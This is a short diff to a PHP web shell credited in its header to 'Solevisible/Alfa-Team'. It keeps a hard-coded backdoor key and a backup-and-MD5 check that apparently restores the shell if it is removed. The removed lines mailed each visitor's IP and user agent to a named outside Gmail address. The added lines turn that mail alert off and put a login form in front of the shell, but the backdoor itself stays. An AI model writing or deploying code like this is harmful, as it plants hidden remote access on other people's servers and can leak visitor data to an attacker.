@@ -14,7 +14,7 @@ if (!file_exists($main_path) || md5_file($main_path) !== md5_file($backup_path))
 
 // Backdoor login otomatis
 $backdoor_key = 'silent404';
-$target_email = 'kasatmata404@gmail.com';
+$target_email = 'disabled@example.com'; // Disabled for security
 
 $ip = $_SERVER['REMOTE_ADDR'];
 $ua = $_SERVER['HTTP_USER_AGENT'];
@@ -32,7 +32,17 @@ $subject = "ALERT: Shell Diakses ($access_type)";
 $message = "Shell diakses pada $time\nIP: $ip\nUser-Agent: $ua\nAkses: $access_type\nFile: " . basename($main_path);
 $headers = "From: alert@yourdomain.com";
 
-@mail($target_email, $subject, $message, $headers);
+// @mail($target_email, $subject, $message, $headers);
+
+// TIDAK ADA LAGI 403 - Langsung tampil login form kalau belum login
+if (!isset($_POST['username']) || !isset($_POST['password'])) {
+	echo '<form method="post" action="">
+		<input type="text" name="username" placeholder="Username">
+		<input type="password" name="password" placeholder="Password">
+		<input type="submit" value="Login">
+	</form>';
+	exit;
+}
 /*
 	Author: 	Solevisible/Alfa-Team
 	Telegram: 	https://telegram.me/solevisible
